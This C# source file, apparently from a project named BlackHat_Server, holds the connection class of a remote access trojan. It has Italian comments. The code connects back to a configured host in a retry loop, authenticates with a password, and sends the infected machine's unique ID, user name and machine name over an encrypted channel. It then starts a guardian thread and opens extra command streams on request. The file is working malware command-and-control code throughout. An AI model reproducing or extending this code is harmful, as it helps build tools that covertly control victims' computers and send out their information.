using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;

namespace BlackHat_Server
{
    class Connection
    {


        public void StartServer()
        {
            // PRIMA CONNESSIONE
            tryConnect();
            // RIMANGO SOPRA FINO A CHE NN SONO CONNESSO

            // ORA SONO CONNESSO CREO THREAD GUARDIAN E THREAD KEEP ALIVE
            Guardian guard = new Guardian();
            guard.StartGuardian();

            

        }
       

        /// <summary>
        /// Prima connessione Con invio di Info di avvio!
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        private void tryConnect()
        {
            
            string host = ST_Client.Instance.Host;
            int port = ST_Client.Instance.Port;

            IPAddress testIP;
            bool isIP = IPAddress.TryParse(host, out testIP);
                        
            while (!ST_Client.Instance.isConnected)
            {
                try
                {
                    if (!isIP)
                        ST_Client.Instance.Connessione.Connect(host, port); // provo a connettermi altrimenti entro nel catch e aspetto X sec
                    else
                        ST_Client.Instance.Connessione.Connect(testIP, port); // provo a connettermi altrimenti entro nel catch e aspetto X sec

                    ST_Client.Instance.isConnected = FirstConnection();

                    if (!ST_Client.Instance.isConnected)
                        System.Threading.Thread.Sleep(30000);
                    
                }
                catch {System.Threading.Thread.Sleep(5000);}
            }

        }
        //***********************************************************


        /// <summary>
        /// Trovo una connessione controllo diritti e invio info di avvio
        /// </summary>
        private bool FirstConnection()
        {
            NetworkStream ns = ST_Client.Instance.Connessione.GetStream();
            string psw = ST_Client.Instance.Password;

            // INVIO LA MIA PASSWORD E IL MIO ID!
            MsgManager mm = new MsgManager(ns);
            
            string pswSend = "PSW|" + psw ;

            mm.SendEncryMessage(pswSend, 20000);

            // ASPETTO RISPOSTA
            string firstAnswer = mm.WaitForEncryMessage(20000);

                                    
           
            //RISPOSTA POSITIVA
            if (firstAnswer == "OK")
            {
               
                GetInfo gi = new GetInfo();

                //RISPONDO CON LE INFO DI AVVIO
                string mn = gi.MachineName();
                string un = gi.UserName();


                string ms = String.Format("{0}|{1}|{2}|{3}|{4}", ST_Client.Instance.UnivoqueID, un, mn, ST_Client.Instance.ServerName, ST_Client.Instance.ServerVersion);
                
                bool sent = mm.SendEncryMessage(ms, 20000);
                // SE INVIO CORRETTAMENTE QUESTO MESSAGGIO SONO CONNESSO 
                if (sent)
                {
                    return true;
                }
                else
                {
                    ST_Client.Instance.Connessione.Close();
                    ST_Client.Instance.Connessione = new TcpClient();
                    return false;
                }
            }
            else
            // RISPOSTA NEGATIVA O NESSUNA RISPOSTA
            {
                ST_Client.Instance.Connessione.Close();
                ST_Client.Instance.Connessione = new TcpClient();
                    return false;
            }
            //---------------------------------------------
        }
        //---------------------------------------------------------------


        /// <summary>
        /// Mando Richiesta di Nuova Slot. Format NEW_STREAM|SERVICE|ID
        /// </summary>
        /// <returns></returns>
        public TcpClient NewSlotRequest(string service, string id)
        {
            bool timeout = false;
            bool connected = false;
            int c = 0;
            TcpClient newSlot = new TcpClient();

            while (!timeout)
            {
                try
                {
                    newSlot.Connect(ST_Client.Instance.Host, ST_Client.Instance.Port);
                    // SE RIESCO A CONNETTERMI ESCO DAL LOOP
                    connected = true;
                    break;
                }
                catch
                {
                    System.Threading.Thread.Sleep(1500);
                }

                c += 1500;

                if (c >= 10000)
                    timeout = true;
                
            }

            // INVIO RICHIESTA
            if (connected)
            {
                MsgManager mm = new MsgManager(newSlot.GetStream());

                string req = String.Format("NEW_STREAM|{0}|{1}", service, id);

                bool sent = mm.SendEncryMessage(req, 5000);

                if (sent)
                {
                    string response = mm.WaitForEncryMessage(10000);

                    // RISPOSTA CORRETTA
                    if (response == "OK")
                    {                       
                        return newSlot;                        
                    }
                    else
                    {
                        
                       // MessageBox.Show("Nessuna risposta di conferma dal Client!");

                        return null;
                    }
                        
                    //--------------------------------------------
                }
                else
                {
                    // NON SONO RIUSCITO AD INVIARE LA RICHIESTA
                    //newSlot.GetStream().Close();
                    //newSlot.Close();

                    return null;
                }

            }
            else
            {
                // NON SONO RIUSCITO A CONNETTERMI
                newSlot.GetStream().Close();
                newSlot.Close();

                return null;

            }

           
        }
        //---------------------------------------------------------------



        

       

        ///// <summary>
        ///// Prima connessione Con invio di Info di avvio!
        ///// </summary>
        ///// <param name="ip"></param>
        ///// <param name="port"></param>
        //public NetworkStream newConnection(string ip, int port, string key)
        //{
           
        //    IPAddress toIp = IPAddress.Parse(ip);
                       
        //    try
        //    {
        //        TcpClient tcpc = new TcpClient();
        //        tcpc.Connect(toIp, port);

        //        MsgManager com = new MsgManager(tcpc.GetStream());

        //        // RICHIEDO UNA NUOVA CONNESSIONE
        //        com.SendEncryMessage("NEW STREAM REQUIRED|KEEP ALIVE|"+key,15000);

                

        //        return tcpc.GetStream();
        //    }
        //    catch 
        //    {
        //        return null;
        //    }
            

        //}
        ////***********************************************************


       
       
    }
}
